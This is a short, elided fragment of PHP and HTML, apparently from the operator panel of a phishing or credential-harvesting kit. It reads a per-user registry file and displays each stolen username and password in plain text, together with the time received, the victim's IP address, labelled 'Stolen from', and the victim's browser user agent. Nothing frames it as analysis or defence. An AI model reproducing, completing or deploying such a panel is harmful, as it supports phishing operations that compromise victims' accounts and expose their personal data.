...
$dataFile = "registry/" . getUserKey($_SESSION['username']) . ".txt";
        ...
        <div id="content">
          ...
          <div id="stolen-data">
            ...
            foreach($list as $item){
              ?>
              <div id="stolen_item">
                <span id="stolen-data-credentials"><?php echo $item->user . ' : ' . $item->password; ?></span><br>
                Received on: <?php echo $item->time; ?><br>
                Stolen from: <?php echo $item->ip ?><br>
                <?php echo $item->user_agent; ?><br>
              </div>
              <?php
            }
            ?>
